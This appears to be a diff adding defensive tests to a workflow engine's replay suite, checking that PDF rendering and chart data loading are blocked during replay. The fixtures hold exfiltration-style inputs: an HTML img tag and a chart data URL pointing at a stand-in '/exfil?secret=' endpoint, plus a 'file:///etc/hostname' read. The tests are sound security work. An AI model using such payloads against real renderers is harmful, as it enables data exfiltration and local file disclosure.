@@ -16,6 +16,7 @@ import {
   getNodeDefinition,
   nodeDefinitions,
   REPLAY_ALWAYS_STUBBED_CLASSES,
+  REPLAY_BLOCKED_LOAD_MARKER,
   REPLAY_STUB_MARKER,
   replayNodeClass,
   type ReplayRecordedNode,
@@ -226,6 +227,33 @@ describe("replay plan", () => {
     expect(plan.warnings).toEqual([expect.objectContaining({ kind: "unrecorded_stub", nodeId: "added" })]);
     const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
     expect(resultOf(result, "added")[0]!.output).toMatchObject({ [REPLAY_STUB_MARKER]: "unrecorded" });
+  });
+
+  it("never renders an HTML PDF in a replay: the recorded PDF is used", async () => {
+    const pdf = node("pdf", "pdf_output", { renderMode: "html", htmlTemplate: "<img src='http://127.0.0.1:9/exfil'>" });
+    const workflow = chain([node("start", "manual_trigger"), pdf]);
+    const plan = buildReplayPlan(workflow, recorded([{ nodeId: "pdf", nodeType: "pdf_output", output: { result: "data:application/pdf;base64,recorded" } }]));
+    expect(plan.decisions[1]).toMatchObject({ nodeClass: "read", action: "recorded" });
+    const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
+    expect(resultOf(result, "pdf")[0]!.output).toEqual({ result: "data:application/pdf;base64,recorded" });
+  });
+
+  it("renders a chart from inline data in a replay but never loads chart data from a URL or file", async () => {
+    const inline = node("inline", "chart", { spec: { mark: "bar", data: { values: [{ a: "x", b: 1 }] }, encoding: { x: { field: "a", type: "nominal" }, y: { field: "b", type: "quantitative" } } } });
+    const remote = node("remote", "chart", { spec: { mark: "bar", data: { url: "http://127.0.0.1:9/exfil?secret=abc" }, encoding: { x: { field: "a", type: "nominal" } } } });
+    const local = node("local", "chart", { spec: { mark: "bar", data: { url: "file:///etc/hostname" }, encoding: { x: { field: "a", type: "nominal" } } } });
+    for (const chart of [remote, local]) {
+      const workflow = chain([node("start", "manual_trigger"), inline, chart]);
+      const plan = buildReplayPlan(workflow, {});
+      expect(plan.decisions.find((decision) => decision.nodeId === chart.id)).toMatchObject({ nodeClass: "logic", action: "run" });
+      const result = await executeWorkflow({ workflow }, deps({ replayNodeHook: plan.hook }));
+      expect(resultOf(result, "inline")[0]!.status).toBe("success");
+      expect(String((resultOf(result, "inline")[0]!.output as Record<string, unknown>).svg)).toContain("<svg");
+      const failed = resultOf(result, chart.id)[0]!;
+      expect(failed.status).toBe("error");
+      expect(failed.error).toContain(REPLAY_BLOCKED_LOAD_MARKER);
+    }
+    expect(fetchCalls).toEqual([]);
   });
 
   it("replays a trigger's recorded output, and runs an unrecorded trigger", async () => {
